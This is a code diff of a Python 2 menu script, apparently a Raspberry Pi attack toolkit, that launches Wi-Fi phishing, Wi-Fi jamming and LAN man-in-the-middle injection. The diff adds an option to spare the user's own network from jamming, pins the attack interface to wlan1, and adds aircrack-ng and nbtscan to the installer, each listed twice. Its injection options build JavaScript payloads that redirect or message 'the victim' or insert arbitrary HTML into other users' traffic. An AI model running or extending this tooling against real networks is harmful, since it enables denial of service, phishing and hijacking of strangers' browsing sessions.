@@ -50,7 +50,14 @@ while True:
         elif HWList == '2':
             os.system('cd 0xHT4RPi/wifiphisher && wifiphisher')
     elif List == '2':
-        os.system('cd 0xHT4RPi/wifijammer && sudo python wifijammer.py')
+        QAttack = raw_input('[=] Do you want to exclude your network from attack Y/n: ')
+        if QAttack == 'y' or QAttack == 'Y':
+            MAC = os.system('nmcli -f SSID,BSSID,CHAN,SIGNAL dev wifi list')
+            MAC = raw_input('\n[+] Enter MAC to exclude your network from attack\n > ')
+            MAC = 'cd 0xHT4RPi/wifijammer && sudo python wifijammer.py -s %s' % (MAC)
+            os.system(MAC)
+        else:
+            os.system('cd 0xHT4RPi/wifijammer && sudo python wifijammer.py')
     elif List == '3':
         print SList
         SList = raw_input(" > ")
@@ -65,22 +72,22 @@ while True:
             if ExIndex == '1':
                 URL = raw_input("[-] Enter URL to redirecting the victim to another Website\n > ")
                 Redirecting = "'""<script>window.location.replace("'"'+URL+'"'");</script>""'"
-                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -c %s' % (Redirecting))
+                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Redirecting))
                 os.system(Exploit)
             elif ExIndex == '2':
                 Message = raw_input('[W] Write a message to your victim\n > ')
                 Alert = "'""<script>alert("'"'+Message+'"'");</script>""'"
-                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -c %s' % (Alert))
+                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Alert))
                 os.system(Exploit)
             elif ExIndex == '3':
                 HTML = raw_input("[*] Enter Your HTML Code\n > ")
-                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -c %s' % (HTML))
+                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (HTML))
                 os.system(Exploit)
         elif SList == '2':
-            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -d')
+            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -d -i wlan1')
             os.system(Exploit)
         elif SList == '3':
-            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p')
+            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -i wlan1')
             os.system(Exploit)
     elif List == '99':
         QInstall = raw_input('[I] Do You Want To Install/Update Tools Y/n \n > ')
@@ -96,7 +103,11 @@ while True:
             os.system('apt-get install -y network-manager')
             os.system('apt-get install -y python-nfqueue')
             os.system('apt-get install -y python-twisted')
+            os.system('apt-get install -y nbtscan')
+            os.system('apt-get install -y aircrack-ng')
             os.system('apt-get install -y driftnet')
+            os.system('apt-get install -y aircrack-ng')
+            os.system('apt-get install -y nbtscan')
             os.system('clear')
             print "[!] Done....."
             os.system("sudo python 0xHT4RPi.py")
